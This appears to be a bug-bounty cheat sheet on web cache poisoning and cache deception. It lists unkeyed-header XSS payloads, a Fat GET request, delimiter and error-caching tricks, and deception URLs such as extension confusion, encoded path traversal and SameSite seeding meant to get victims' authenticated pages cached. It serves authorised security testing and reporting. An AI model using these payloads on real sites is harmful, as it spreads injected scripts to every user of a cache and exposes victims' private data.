# Moraa — Web cache poisoning & deception

> HackTricks `cache-deception` + PortSwigger research. High-bounty, scanner-invisible. Cross-ref
> [[bypass-4xx]] (edge-vs-origin parsing), [[request-smuggling]] (desync→cache), [[xss]] (payload).

## Two families
- **Poisoning:** attacker gets a malicious response **stored in a shared cache** → served to other
  users (XSS/redirect/DoS to everyone).
- **Deception:** attacker tricks the cache into storing a **victim's authenticated response** under a
  cacheable key → attacker retrieves the victim's data/secrets anonymously.

## 0. Is there a cache? (detect first)
Look for `X-Cache: hit/miss`, `Age:`, `Cache-Control`, `CF-Cache-Status`, `X-Served-By`, `Vary`.
Send `?cb=<rand>` twice → second is `hit`/higher `Age` = cached. **Always use a unique cache-buster
per test so you never poison the real key on production.**

## POISONING — find an UNKEYED input that reflects
The core: an input that (a) changes the response but (b) is NOT part of the cache key → you poison the
key everyone shares. Use **Param Miner** (Burp) to brute headers/params.
| Vector | Test | Impact |
|---|---|---|
| Unkeyed header reflection | `X-Forwarded-Host: attacker"><script>...`, `X-Forwarded-Scheme: http`, `X-Host`, `X-Forwarded-Server` | reflected XSS / redirect / OG-tag poisoning to all users |
| Unkeyed query param | Param Miner → param reflected unsanitized, absent from key | XSS/redirect cached |
| Multiple unkeyed | `X-Forwarded-Host: evil` + `X-Forwarded-Scheme: http` | force HTTPS→HTTP redirect for everyone |
| Cookie reflection | XSS in a reflected cookie value | poisons for users sharing that cookie |
| Fat GET | body param the cache ignores but backend reads (see below) | payload runs, safe URL cached |
| Delimiter abuse | Ruby/others treat `;` as separator: `?id=1;xss=payload` | unkeyed 2nd param processed |
| Error caching (DoS) | malformed header → cached `400` | denies the page to everyone |
| Desync→cache | CL.TE/TE.CL smuggle a response into the cache ([[request-smuggling]]) | arbitrary poisoned response |
```
# Fat GET: cache keys the URL (id=safe), backend reads the body (id=payload)
GET /report?id=safe HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

id=<payload>
```
Confirm: poison with a unique buster, then fetch the SAME URL from a clean context and see the payload served from cache (`X-Cache: hit`).

## DECEPTION — make the cache store the victim's authed page
| Trick | Payload | Why |
|---|---|---|
| Extension confusion | `/account` → `/account.css`, `/account.php/x.js`, `/account/nonexistent.css` | cache stores by extension, ignores real content-type → victim HTML cached as static |
| Odd extensions | `.avif`, `.webp`, `.gif`, `.ico` when `.css/.js` are handled | dodge extension allowlists |
| Path traversal (edge≠origin) | `/%2F..%2Fapi/auth/session?cb=1` (CDN doesn't decode `%2F`, origin does) | authed JSON cached under a static-looking key (OpenAI-style) |
| CSPT + extension | SPA builds `/v1/users/{id}`; set `id=../../v1/token.css` → browser normalizes to `/v1/token.css` | authed token JSON cached publicly |
| Query cache-buster isolation | authed page with secrets in HTML + `?cb=uniq` | victim's response stored under `uniq`; attacker replays exact URL anonymously |
| SameSite=Lax seeding | `<meta http-equiv=refresh content="0;url=https://t/?cb=1">` (top-level nav sends the cookie) | seed the cache with the victim's authed response despite Lax |
The attack: lure the victim to the crafted URL (their cookie → authed response cached), then you
request the identical URL with no cookie and read their data from the cache.

## Confirm & report
1. prove the cache (`X-Cache`/`Age`), 2. show the unkeyed input / cacheable-key trick, 3. demonstrate a
DIFFERENT client receiving the poisoned/authed response, 4. state blast radius (all users of the key /
any victim lured to a link). Keep tests on unique busters; never leave a poisoned entry on a real key.

## Tools
Burp **Param Miner** (unkeyed inputs), `wcvs -u host`, `toxicache`, `CacheDecepHound`.
